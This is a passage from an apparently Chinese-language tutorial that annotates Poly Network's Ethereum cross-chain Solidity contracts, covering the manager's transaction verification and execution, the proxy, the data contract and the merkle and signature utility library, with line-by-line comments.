//从CCD合约中获取保存的共识验证者公钥的字节，将字节解码为对应的共识验证者的地址</span><br><span class="line">        uint256 curEpochStartHeight = eccd.getCurEpochStartHeight();</span><br><span class="line">		//从CCD合约中获取保存的区块高度。</span><br><span class="line"></span><br><span class="line">        uint n = polyChainBKs.length;     //得到共识验证者的数量</span><br><span class="line">        if (header.height &gt;= curEpochStartHeight) &#123;</span><br><span class="line">        	//如果跨链交易区块高度大于CCD中保存的区块高度，说明两者是在一个epoch中，直接验证交易区块头的签名</span><br><span class="line">            // It&#x27;s enough to verify rawHeader signature</span><br><span class="line">            require(ECCUtils.verifySig(rawHeader, headerSig, polyChainBKs, n - ( n - 1) / 3), &quot;Verify poly chain header signature failed!&quot;);</span><br><span class="line">            //验证包含跨链交易的rawHeader，是否经过了poly chain上的共识验证者签名</span><br><span class="line">            </span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // We need to verify the signature of curHeader </span><br><span class="line">            require(ECCUtils.verifySig(curRawHeader, headerSig, polyChainBKs, n - ( n - 1) / 3), &quot;Verify poly chain current epoch header signature failed!&quot;);</span><br><span class="line">            //验证poly chain上当前epoch的区块头是否经过了共识验证者的签名</span><br><span class="line"></span><br><span class="line">            // Then use curHeader.StateRoot and headerProof to verify rawHeader.CrossStateRoot</span><br><span class="line">            ECCUtils.Header memory curHeader = ECCUtils.deserializeHeader(curRawHeader);</span><br><span class="line">            //解码出poly chain上当前epoch区块头的结构体信息</span><br><span class="line">            bytes memory proveValue = ECCUtils.merkleProve(headerProof, curHeader.blockRoot);</span><br><span class="line">            //通过headerProof,验证rawHeader区块头是否为合法区块头。</span><br><span class="line">            require(ECCUtils.getHeaderHash(rawHeader) == Utils.bytesToBytes32(proveValue), &quot;verify header proof failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // Through rawHeader.CrossStatesRoot, the toMerkleValue or cross chain msg can be verified and parsed from proof</span><br><span class="line">        bytes memory toMerkleValueBs = ECCUtils.merkleProve(proof, header.crossStatesRoot);</span><br><span class="line">        //验证poly chain上包含的跨链交易，根据proof解析出包含的跨链信息toMerkleValueBs</span><br><span class="line"> </span><br><span class="line">        ECCUtils.ToMerkleValue memory toMerkleValue = ECCUtils.deserializeMerkleValue(toMerkleValueBs);</span><br><span class="line">        //解析字节形式的toMerkleValueBs为对应的结构体</span><br><span class="line">        </span><br><span class="line">        require(!eccd.checkIfFromChainTxExist(toMerkleValue.fromChainID, Utils.bytesToBytes32(toMerkleValue.txHash)), &quot;the transaction has been executed!&quot;);</span><br><span class="line">        //require()调用CCD合约checkIfFromChainTxExist()函数来，根据chainID和交易哈希判断该交易是否已经处理过</span><br><span class="line">        </span><br><span class="line">        require(eccd.markFromChainTxExist(toMerkleValue.fromChainID, Utils.bytesToBytes32(toMerkleValue.txHash)), &quot;Save crosschain tx exist failed!&quot;);</span><br><span class="line">        //require()调用CCD合约markFromChainTxExist()函数，根据chainID和交易哈希标记该交易已经处理</span><br><span class="line"></span><br><span class="line">        require(toMerkleValue.makeTxParam.toChainId == chainId, &quot;This Tx is not aiming at this network!&quot;);</span><br><span class="line">        //检查交易中保存的toChainID是否为以太坊</span><br><span class="line"></span><br><span class="line">        address toContract = Utils.bytesToAddress(toMerkleValue.makeTxParam.toContract);</span><br><span class="line">        //获取目标合约，并将其转换为地址，以便CCM合约触发跨链交易tx在以太坊上执行</span><br><span class="line"></span><br><span class="line">        require(whiteListContractMethodMap[toContract][toMerkleValue.makeTxParam.method],&quot;Invalid to contract or method&quot;);</span><br><span class="line">        //判断交易调用的合约，和对应的函数是否保存在对应的白名单之中</span><br><span class="line"></span><br><span class="line">        require(_executeCrossChainTx(toContract, toMerkleValue.makeTxParam.method, toMerkleValue.makeTxParam.args, toMerkleValue.makeTxParam.fromContract, toMerkleValue.fromChainID), &quot;Execute CrossChain Tx failed!&quot;);</span><br><span class="line">        //执行对应的跨链函数</span><br><span class="line"></span><br><span class="line">        emit VerifyHeaderAndExecuteTxEvent(toMerkleValue.fromChainID, toMerkleValue.makeTxParam.toContract, toMerkleValue.txHash, toMerkleValue.makeTxParam.txHash);</span><br><span class="line">		//emit 对应事件，表示从其它公链到以太坊这样的跨链交易成功执行</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //调用对应的目标合约，触发以太坊上跨链交易的执行</span><br><span class="line">    //输入：调用的合约的地址，调用的函数，输入的参数，源链上智能合约的地址，源链的chainID</span><br><span class="line">    function _executeCrossChainTx(address _toContract, bytes memory _method, bytes memory _args, bytes memory _fromContractAddr, uint64 _fromChainId) internal returns (bool)&#123;</span><br><span class="line">        require(Utils.isContract(_toContract), &quot;The passed in address is not a contract!&quot;);</span><br><span class="line">        //确保将要调用的_toContract是一个合约，而不是一个账户地址</span><br><span class="line">        bytes memory returnData;</span><br><span class="line">        bool success;</span><br><span class="line"></span><br><span class="line">        (success, returnData) = _toContract.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_args, _fromContractAddr, _fromChainId)));</span><br><span class="line">		//首先将_method和输入参数的格式“(bytes,bytes,uint64)”进行encodePacked编码</span><br><span class="line">		//使用keccak256计算编码字符的哈希，并取前四个字节。</span><br><span class="line">		//将哈希的前四个字节，和encode编码的三个参数，一起进行encodePacked编码，作为一个函数调用</span><br><span class="line">		</span><br><span class="line">        require(success == true, &quot;EthCrossChain call business contract failed&quot;);</span><br><span class="line">        //确保对应函数的调用成功执行</span><br><span class="line"></span><br><span class="line">        require(returnData.length != 0, &quot;No return value from business contract!&quot;);</span><br><span class="line">        (bool res,) = ZeroCopySource.NextBool(returnData, 31);</span><br><span class="line">        require(res == true, &quot;EthCrossChain call business contract return is not true&quot;);</span><br><span class="line">        //调用方法后，检查对应的返回值，调用成功，returnData将是bytes32类型，并且最后一个字节为01.</span><br><span class="line">        //只有返回值为真，整个跨链交易才会执行成功</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Cross-Chain-Manager-Proxy-Contract"><a href="#Cross-Chain-Manager-Proxy-Contract" class="headerlink" title="Cross Chain Manager Proxy Contract:"></a>Cross Chain Manager Proxy Contract:</h3><h4 id="EthCrossChainManagerProxy-sol"><a href="#EthCrossChainManagerProxy-sol" class="headerlink" title="EthCrossChainManagerProxy.sol"></a><code>EthCrossChainManagerProxy.sol</code></h4><p>代码github位置：polynetwork/eth-contracts/contracts/core/cross_chain_manager/upgrade/EthCrossChainManagerProxy.sol</p>
<p><a href="https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/upgrade/EthCrossChainManagerProxy.sol">https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/upgrade/EthCrossChainManagerProxy.sol</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line">import &quot;./../../../libs/ownership/Ownable.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/lifecycle/Pausable.sol&quot;;</span><br><span class="line">import &quot;./../interface/IUpgradableECCM.sol&quot;;</span><br><span class="line">import &quot;./../interface/IEthCrossChainManagerProxy.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract EthCrossChainManagerProxy is IEthCrossChainManagerProxy, Ownable, Pausable &#123;</span><br><span class="line">    address private EthCrossChainManagerAddr_;   //对应的跨链管理合约的地址 </span><br><span class="line">    </span><br><span class="line">    constructor(address _ethCrossChainManagerAddr) public &#123;</span><br><span class="line">        EthCrossChainManagerAddr_ = _ethCrossChainManagerAddr;</span><br><span class="line">    &#125;  //constructor()在合约部署的时候，设置跨链管理合约的地址</span><br><span class="line">    </span><br><span class="line">    //调用者账户pause()函数，触发合约到对应的暂停状态</span><br><span class="line">    function pause() onlyOwner public returns (bool) &#123;</span><br><span class="line">        if (paused()) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        _pause();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    //调用者账户unpause()函数，恢复合约到对应的正常状态</span><br><span class="line">    function unpause() onlyOwner public returns (bool) &#123;</span><br><span class="line">        if (!paused()) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        _unpause();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    //触发对应的跨链管理合约为暂停状态</span><br><span class="line">    function pauseEthCrossChainManager() onlyOwner whenNotPaused public returns (bool) &#123;</span><br><span class="line">        IUpgradableECCM eccm = IUpgradableECCM(EthCrossChainManagerAddr_);</span><br><span class="line">        require(pause(), &quot;pause EthCrossChainManagerProxy contract failed!&quot;);</span><br><span class="line">        //将CCMP合约设置为暂停状态</span><br><span class="line">        require(eccm.pause(), &quot;pause EthCrossChainManager contract failed!&quot;);</span><br><span class="line">        //将CCM合约设置为暂停状态</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //更新跨链管理合约CCM合约的地址</span><br><span class="line">    function upgradeEthCrossChainManager(address _newEthCrossChainManagerAddr) onlyOwner whenPaused public returns (bool) &#123;</span><br><span class="line">        IUpgradableECCM eccm = IUpgradableECCM(EthCrossChainManagerAddr_);</span><br><span class="line">        if (!eccm.paused()) &#123;</span><br><span class="line">            require(eccm.pause(), &quot;Pause old EthCrossChainManager contract failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        //更新CCM合约之前，先将CCM合约的状态设置为暂停状态。</span><br><span class="line">        require(eccm.upgradeToNew(_newEthCrossChainManagerAddr), &quot;EthCrossChainManager upgradeToNew failed!&quot;);</span><br><span class="line">        //调用该函数，将对应的modifier中的owner设置为新的跨链管理合约的地址</span><br><span class="line">        IUpgradableECCM neweccm = IUpgradableECCM(_newEthCrossChainManagerAddr);</span><br><span class="line">        require(neweccm.isOwner(), &quot;EthCrossChainManagerProxy is not owner of new EthCrossChainManager contract&quot;);</span><br><span class="line">        EthCrossChainManagerAddr_ = _newEthCrossChainManagerAddr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //将对应的跨链管理合约恢复为正常状态</span><br><span class="line">    function unpauseEthCrossChainManager() onlyOwner whenPaused public returns (bool) &#123;</span><br><span class="line">        IUpgradableECCM eccm = IUpgradableECCM(EthCrossChainManagerAddr_);</span><br><span class="line">        require(eccm.unpause(), &quot;unpause EthCrossChainManager contract failed!&quot;);</span><br><span class="line">        //将CCM合约恢复为正常状态</span><br><span class="line">        require(unpause(), &quot;unpause EthCrossChainManagerProxy contract failed!&quot;);</span><br><span class="line">        //将CCMP合约恢复为正常状态</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //调用该函数获得CCM合约的地址</span><br><span class="line">    function getEthCrossChainManager() whenNotPaused public view returns (address) &#123;</span><br><span class="line">        return EthCrossChainManagerAddr_;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //改变区块链的链ID</span><br><span class="line">    function changeManagerChainID(uint64 _newChainId) onlyOwner whenPaused public &#123;</span><br><span class="line">        IUpgradableECCM eccm = IUpgradableECCM(EthCrossChainManagerAddr_);</span><br><span class="line">        if (!eccm.paused()) &#123;</span><br><span class="line">            require(eccm.pause(), &quot;Pause old EthCrossChainManager contract failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        //在修改链ID之前，将对应的CCM跨链管理合约触发为暂停状态</span><br><span class="line">        require(eccm.setChainId(_newChainId), &quot;set chain ID failed. &quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Cross-Chain-Data-Contract"><a href="#Cross-Chain-Data-Contract" class="headerlink" title="Cross Chain Data Contract:"></a>Cross Chain Data Contract:</h3><h4 id="EthCorssChainData-sol"><a href="#EthCorssChainData-sol" class="headerlink" title="EthCorssChainData.sol"></a><code>EthCorssChainData.sol</code></h4><p>代码github位置：polynetwork/eth-contracts/contracts/core/cross_chain_manager/data/EthCrossChainData.sol</p>
<p><a href="https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/data/EthCrossChainData.sol">https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/data/EthCrossChainData.sol</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line">import &quot;./../../../libs/ownership/Ownable.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/lifecycle/Pausable.sol&quot;;</span><br><span class="line">import &quot;./../interface/IEthCrossChainData.sol&quot;;</span><br><span class="line">contract EthCrossChainData is IEthCrossChainData, Ownable, Pausable&#123;</span><br><span class="line">    //该映射存储以太坊发起的跨链交易的哈希值，以自增的index为键，对应的跨链交易哈希为值</span><br><span class="line">    //该映射是为了Poly Chain可以验证来自以太坊的跨链交易请求tx的存在</span><br><span class="line">    mapping(uint256 =&gt; bytes32) public EthToPolyTxHashMap;</span><br><span class="line">    </span><br><span class="line">    // uint256 index记录着当前映射mapping的长度</span><br><span class="line">    uint256 public EthToPolyTxHashIndex;</span><br><span class="line">    </span><br><span class="line">    //当Poly Chain更改共识验证者的时候，poly chain的共识验证者的公钥需要转换成bytes形式，</span><br><span class="line">    //以便智能合约将其转换为地址类型，并验证Poly chain账户签名衍生的签名</span><br><span class="line">    bytes public ConKeepersPkBytes;</span><br><span class="line"></span><br><span class="line">    //记录着poly chain区块上当前epoch的起始高度</span><br><span class="line">    uint32 public CurEpochStartHeight;</span><br><span class="line">    </span><br><span class="line">    //以链的chainID,对应的跨链交易bytes为键，映射的值--表示该交易是否已经被处理</span><br><span class="line">    mapping(uint64 =&gt; mapping(bytes32 =&gt; bool)) FromChainTxExist;</span><br><span class="line">    </span><br><span class="line">    // 未用到，未来的潜在使用</span><br><span class="line">    mapping(bytes32 =&gt; mapping(bytes32 =&gt; bytes)) public ExtraData;</span><br><span class="line">    </span><br><span class="line">    // 存储poly chain区块上当前epoch的起始高度</span><br><span class="line">    function putCurEpochStartHeight(uint32 curEpochStartHeight) public whenNotPaused onlyOwner returns (bool) &#123;</span><br><span class="line">        CurEpochStartHeight = curEpochStartHeight;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获得之前存储的poly chain区块上的epoch的起始高度</span><br><span class="line">    function getCurEpochStartHeight() public view returns (uint32) &#123;</span><br><span class="line">        return CurEpochStartHeight;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //存储共识验证者的公钥对应的字节</span><br><span class="line">    function putCurEpochConPubKeyBytes(bytes memory curEpochPkBytes) public whenNotPaused onlyOwner returns (bool) &#123;</span><br><span class="line">        ConKeepersPkBytes = curEpochPkBytes;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获得之前存储的共识验证者的公钥所对应的字节</span><br><span class="line">    function getCurEpochConPubKeyBytes() public view returns (bytes memory) &#123;</span><br><span class="line">        return ConKeepersPkBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 标记来自源链chainID,对应的bytes32 tx已经被处理，modifier onlyOwner显示只有对应的owner才能调用该函数</span><br><span class="line">    function markFromChainTxExist(uint64 fromChainId, bytes32 fromChainTx) public whenNotPaused onlyOwner returns (bool) &#123;</span><br><span class="line">        FromChainTxExist[fromChainId][fromChainTx] = true;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //判断来自fromchainID的交易fromchaintx是否已经被处理</span><br><span class="line">    function checkIfFromChainTxExist(uint64 fromChainId, bytes32 fromChainTx) public view returns (bool) &#123;</span><br><span class="line">        return FromChainTxExist[fromChainId][fromChainTx];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //获取当前记录的跨链请求tx的索引，该txs是记录从以太坊到其它公共链的跨链请求</span><br><span class="line">    //以帮助CCM合约来区分两个跨链tx的请求</span><br><span class="line">    function getEthTxHashIndex() public view returns (uint256) &#123;</span><br><span class="line">        return EthToPolyTxHashIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //保存以太坊上的跨链交易tx的哈希，将对应记录的index自增1</span><br><span class="line">    function putEthTxHash(bytes32 ethTxHash) public whenNotPaused onlyOwner returns (bool) &#123;</span><br><span class="line">        EthToPolyTxHashMap[EthToPolyTxHashIndex] = ethTxHash;</span><br><span class="line">        EthToPolyTxHashIndex = EthToPolyTxHashIndex + 1;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //根据对应的ethTxHashIndex索引来获得对应的以太坊上的跨链交易的哈希</span><br><span class="line">    function getEthTxHash(uint256 ethTxHashIndex) public view returns (bytes32) &#123;</span><br><span class="line">        return EthToPolyTxHashMap[ethTxHashIndex];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // extra data的存储函数, 可能未来使用</span><br><span class="line">    function putExtraData(bytes32 key1, bytes32 key2, bytes memory value) public whenNotPaused onlyOwner returns (bool) &#123;</span><br><span class="line">        ExtraData[key1][key2] = value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    // extra data的读取函数，可能未来使用</span><br><span class="line">    function getExtraData(bytes32 key1, bytes32 key2) public view returns (bytes memory) &#123;</span><br><span class="line">        return ExtraData[key1][key2];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //调用pause()函数，触发将对应的合约设置为停止状态</span><br><span class="line">    function pause() onlyOwner whenNotPaused public returns (bool) &#123;</span><br><span class="line">        _pause();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //调用unpause()函数，将对应的合约设置为恢复</span><br><span class="line">    function unpause() onlyOwner whenPaused public returns (bool) &#123;</span><br><span class="line">        _unpause();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="其它关键合约"><a href="#其它关键合约" class="headerlink" title="其它关键合约"></a>其它关键合约</h3><h4 id="EthCrossChainUtils-sol"><a href="#EthCrossChainUtils-sol" class="headerlink" title="EthCrossChainUtils.sol"></a><code>EthCrossChainUtils.sol</code></h4><p>代码github位置：polynetwork/eth-contracts/contracts/core/cross_chain_manager/libs/EthCrossChainUtils.sol</p>
<p><a href="https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/libs/EthCrossChainUtils.sol">https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/libs/EthCrossChainUtils.sol</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line">import &quot;./../../../libs/common/ZeroCopySource.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/common/ZeroCopySink.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/utils/Utils.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/math/SafeMath.sol&quot;;</span><br><span class="line">library ECCUtils &#123;</span><br><span class="line">    using SafeMath for uint256;       //基本的算术运算，防止溢出</span><br><span class="line">    struct Header &#123;</span><br><span class="line">        uint32 version;</span><br><span class="line">        uint64 chainId;</span><br><span class="line">        uint32 timestamp;</span><br><span class="line">        uint32 height;</span><br><span class="line">        uint64 consensusData;</span><br><span class="line">        bytes32 prevBlockHash;</span><br><span class="line">        bytes32 transactionsRoot;</span><br><span class="line">        bytes32 crossStatesRoot;</span><br><span class="line">        bytes32 blockRoot;</span><br><span class="line">        bytes consensusPayload;</span><br><span class="line">        bytes20 nextBookkeeper;</span><br><span class="line">    &#125;       </span><br><span class="line">    struct ToMerkleValue &#123;</span><br><span class="line">        bytes  txHash;  // cross chain txhash</span><br><span class="line">        uint64 fromChainID;</span><br><span class="line">        TxParam makeTxParam;</span><br><span class="line">    &#125;</span><br><span class="line">    struct TxParam &#123;</span><br><span class="line">        bytes txHash; //  source chain txhash</span><br><span class="line">        bytes crossChainId;</span><br><span class="line">        bytes fromContract;</span><br><span class="line">        uint64 toChainId;</span><br><span class="line">        bytes toContract;</span><br><span class="line">        bytes method;</span><br><span class="line">        bytes args;</span><br><span class="line">    &#125;</span><br><span class="line">    uint constant POLYCHAIN_PUBKEY_LEN = 67;</span><br><span class="line">    uint constant POLYCHAIN_SIGNATURE_LEN = 65;</span><br><span class="line"></span><br><span class="line">    /* @notice                  Verify Poly chain transaction whether exist or not</span><br><span class="line">    *  @param _auditPath        Poly chain merkle proof</span><br><span class="line">    *  @param _root             Poly chain root</span><br><span class="line">    *  @return                  The verified value included in _auditPath</span><br><span class="line">    */</span><br><span class="line">    //进行merkle proof的验证，验证对应的交易是否合法，proof中包含对应的跨链消息，解码返回</span><br><span class="line">    function merkleProve(bytes memory _auditPath, bytes32 _root) internal pure returns (bytes memory) &#123;</span><br><span class="line">        uint256 off = 0;</span><br><span class="line">        bytes memory value;</span><br><span class="line">        (value, off)  = ZeroCopySource.NextVarBytes(_auditPath, off);</span><br><span class="line">        bytes32 hash = Utils.hashLeaf(value);</span><br><span class="line">        //从_auditPath中读取得到树的根哈希值</span><br><span class="line">        </span><br><span class="line">        uint size = _auditPath.length.sub(off).div(33);</span><br><span class="line">        //得到对应的节点数量，每个节点33个字节，第一个字节代表左右节点，32字节哈希</span><br><span class="line">        bytes32 nodeHash;</span><br><span class="line">        byte pos;</span><br><span class="line">        for (uint i = 0; i &lt; size; i++) &#123;</span><br><span class="line">            (pos, off) = ZeroCopySource.NextByte(_auditPath, off);</span><br><span class="line">            //读取每个节点的第一个字节进行判断</span><br><span class="line">            (nodeHash, off) = ZeroCopySource.NextHash(_auditPath, off);</span><br><span class="line">            //获取每个节点的节点哈希</span><br><span class="line">            if (pos == 0x00) &#123;</span><br><span class="line">                hash = Utils.hashChildren(nodeHash, hash);</span><br><span class="line">            &#125; else if (pos == 0x01) &#123;</span><br><span class="line">                hash = Utils.hashChildren(hash, nodeHash);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                revert(&quot;merkleProve, NextByte for position info failed&quot;);</span><br><span class="line">                节点第一个字节不符合对应格式，报错</span><br><span class="line">            &#125;</span><br><span class="line">            //判断节点为对应的左节点还是右结点，分别计算对应的哈希</span><br><span class="line">        &#125;</span><br><span class="line">        require(hash == _root, &quot;merkleProve, expect root is not equal actual root&quot;);</span><br><span class="line">        //将对应根据路径计算出的哈希值，和保存的哈希值进行比较，判断对应根哈希是否正确</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice              calculate next book keeper according to public key list</span><br><span class="line">    *  @param _keyLen       consensus node number</span><br><span class="line">    *  @param _m            minimum signature number</span><br><span class="line">    *  @param _pubKeyList   consensus node public key list</span><br><span class="line">    *  @return              two element: next book keeper, consensus node signer addresses</span><br><span class="line">    */</span><br><span class="line">    //根据共识验证者的公钥来计算出下一代的共识验证者</span><br><span class="line">    //输入：共识验证者的数量，最少的签名数量，共识验证者的公钥</span><br><span class="line">    //输出：bytes下一代共识验证者，以及共识验证者的地址</span><br><span class="line">    function _getBookKeeper(uint _keyLen, uint _m, bytes memory _pubKeyList) internal pure returns (bytes20, address[] memory)&#123;</span><br><span class="line">         bytes memory buff;</span><br><span class="line">         buff = ZeroCopySink.WriteUint16(uint16(_keyLen));</span><br><span class="line">         address[] memory keepers = new address[](_keyLen);</span><br><span class="line">         bytes32 hash;</span><br><span class="line">         bytes memory publicKey;</span><br><span class="line">         for(uint i = 0; i &lt; _keyLen; i++)&#123;</span><br><span class="line">             publicKey = Utils.slice(_pubKeyList, i*POLYCHAIN_PUBKEY_LEN, POLYCHAIN_PUBKEY_LEN);</span><br><span class="line">             //得到每个共识验证者对应的公钥</span><br><span class="line">             buff =  abi.encodePacked(buff, ZeroCopySink.WriteVarBytes(Utils.compressMCPubKey(publicKey)));</span><br><span class="line">             hash = keccak256(Utils.slice(publicKey, 3, 64));</span><br><span class="line">             keepers[i] = address(uint160(uint256(hash)));</span><br><span class="line">             //将公钥进行哈希，获得共识验证者的地址</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         buff = abi.encodePacked(buff, ZeroCopySink.WriteUint16(uint16(_m)));</span><br><span class="line">         bytes20  nextBookKeeper = ripemd160(abi.encodePacked(sha256(buff)));</span><br><span class="line">         return (nextBookKeeper, keepers);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice              Verify public key derived from Poly chain</span><br><span class="line">    *  @param _pubKeyList   serialized consensus node public key list</span><br><span class="line">    *  @param _sigList      consensus node signature list</span><br><span class="line">    *  @return              return two element: next book keeper, consensus node signer addresses</span><br><span class="line">    */</span><br><span class="line">    //验证来自poly chain的公钥   输入是序列化的共识验证者公钥</span><br><span class="line">    //返回的是下一代的共识验证者，以及对应共识验证者的地址。</span><br><span class="line">    function verifyPubkey(bytes memory _pubKeyList) internal pure returns (bytes20, address[] memory) &#123;</span><br><span class="line">        require(_pubKeyList.length % POLYCHAIN_PUBKEY_LEN == 0, &quot;_pubKeyList length illegal!&quot;);</span><br><span class="line">        //确保公钥长度能够整除单个polychain上的公钥长度，确保公钥长度合法</span><br><span class="line">        uint n = _pubKeyList.length / POLYCHAIN_PUBKEY_LEN;  //得到对应的公钥数量</span><br><span class="line">        require(n &gt;= 1, &quot;too short _pubKeyList!&quot;);     //验证确保公钥的数量大于1</span><br><span class="line">        return _getBookKeeper(n, n - (n - 1) / 3, _pubKeyList);</span><br><span class="line">        //调用_getBookKeeper()获得共识验证者的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice              Verify Poly chain consensus node signature</span><br><span class="line">    *  @param _rawHeader    Poly chain block header raw bytes</span><br><span class="line">    *  @param _sigList      consensus node signature list</span><br><span class="line">    *  @param _keepers      addresses corresponding with Poly chain book keepers&#x27; public keys</span><br><span class="line">    *  @param _m            minimum signature number</span><br><span class="line">    *  @return              true or false</span><br><span class="line">    */</span><br><span class="line">    //验证poly chain上的共识验证者的签名，判断某个交易是否经过poly chain的验证</span><br><span class="line">    //输入：poly chain上的区块头数据，共识验证者的签名，共识验证者地址，最少需要有的签名数量</span><br><span class="line">    function verifySig(bytes memory _rawHeader, bytes memory _sigList, address[] memory _keepers, uint _m) internal pure returns (bool)&#123;</span><br><span class="line">        bytes32 hash = getHeaderHash(_rawHeader);</span><br><span class="line">		</span><br><span class="line">        uint sigCount = _sigList.length.div(POLYCHAIN_SIGNATURE_LEN);</span><br><span class="line">        address[] memory signers = new address[](sigCount);</span><br><span class="line">        bytes32 r;</span><br><span class="line">        bytes32 s;</span><br><span class="line">        uint8 v;</span><br><span class="line">        for(uint j = 0; j  &lt; sigCount; j++)&#123;</span><br><span class="line">            r = Utils.bytesToBytes32(Utils.slice(_sigList, j*POLYCHAIN_SIGNATURE_LEN, 32));</span><br><span class="line">            s =  Utils.bytesToBytes32(Utils.slice(_sigList, j*POLYCHAIN_SIGNATURE_LEN + 32, 32));</span><br><span class="line">            v =  uint8(_sigList[j*POLYCHAIN_SIGNATURE_LEN + 64]) + 27;</span><br><span class="line">            signers[j] =  ecrecover(sha256(abi.encodePacked(hash)), v, r, s);</span><br><span class="line">            if (signers[j] == address(0)) return false;</span><br><span class="line">        &#125;</span><br><span class="line">        //利用共识验证者的签名，调用ecrecover()函数计算出签名者的地址，进行地址的验证</span><br><span class="line">        return Utils.containMAddresses(_keepers, signers, _m);</span><br><span class="line">		//调用Utils中的containMAddresses函数</span><br><span class="line">		//来判断区块头中计算出的签名者公钥，和CCD保存的签名者公钥，是否有_m个签名，验证是否通过</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //将对应的poly chain上的共识验证者的地址，编码为对应的bytes字节形式</span><br><span class="line">    function serializeKeepers(address[] memory keepers) internal pure returns (bytes memory) &#123;</span><br><span class="line">        uint256 keeperLen = keepers.length;</span><br><span class="line">        bytes memory keepersBytes = ZeroCopySink.WriteUint64(uint64(keeperLen));</span><br><span class="line">        for(uint i = 0; i &lt; keeperLen; i++) &#123;</span><br><span class="line">            keepersBytes = abi.encodePacked(keepersBytes, ZeroCopySink.WriteVarBytes(Utils.addressToBytes(keepers[i])));</span><br><span class="line">        &#125;</span><br><span class="line">        return keepersBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //将poly chain上的字节bytes形式保存的共识验证者地址，解码为address形式</span><br><span class="line">    function deserializeKeepers(bytes memory keepersBytes) internal pure returns (address[] memory) &#123;</span><br><span class="line">        uint256 off = 0;</span><br><span class="line">        uint64 keeperLen;</span><br><span class="line">        (keeperLen, off) = ZeroCopySource.NextUint64(keepersBytes, off);</span><br><span class="line">        address[] memory keepers = new address[](keeperLen);</span><br><span class="line">        bytes memory keeperBytes;</span><br><span class="line">        for(uint i = 0; i &lt; keeperLen; i++) &#123;</span><br><span class="line">            (keeperBytes, off) = ZeroCopySource.NextVarBytes(keepersBytes, off);</span><br><span class="line">            keepers[i] = Utils.bytesToAddress(keeperBytes);</span><br><span class="line">        &#125;</span><br><span class="line">        return keepers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //将Poly Chain传递的交易数据进行解码，得到对应的toMerkleValue结构体数据</span><br><span class="line">    function deserializeMerkleValue(bytes memory _valueBs) internal pure returns (ToMerkleValue memory) &#123;</span><br><span class="line">        ToMerkleValue memory toMerkleValue;</span><br><span class="line">        uint256 off = 0;</span><br><span class="line"></span><br><span class="line">        (toMerkleValue.txHash, off) = ZeroCopySource.NextVarBytes(_valueBs, off);</span><br><span class="line">        (toMerkleValue.fromChainID, off) = ZeroCopySource.NextUint64(_valueBs, 